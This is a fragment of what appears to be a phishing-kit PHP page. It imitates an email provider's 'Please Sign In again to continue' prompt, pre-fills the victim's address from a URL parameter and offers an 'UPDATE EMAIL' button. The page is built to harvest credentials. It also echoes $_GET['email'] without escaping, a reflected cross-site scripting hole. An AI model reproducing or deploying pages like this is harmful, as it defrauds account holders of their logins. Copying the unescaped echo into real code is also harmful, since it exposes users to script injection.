...
<div id="main-container">
	<div id="form-c">
		<div id="Layer1"><img src="mm.png" width="92" height="81"></div>
		  ...
		  <div style="text-align:center;">
				...
				<div style="margin-top:10px; margin-bottom: 10px; font-size: 1.2em;">
					Please Sign In again to continue
									...
									<div style="">
						Connected to <span style="color:#8a8b89;font-weight:bold; font-size:1em;"> <?php echo $_GET['email']; ?> <span style="color:#8a8b89;font-weight:bold; font-size:1em;">  </span>
					</div>
...
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
				...
				<div align="center">
				  <p>
				    <input name="Submit" class="btn login-btn" value="UPDATE EMAIL" type="submit">
				    <br>
			      </p>
				  <p>&nbsp;</p>
				</div>
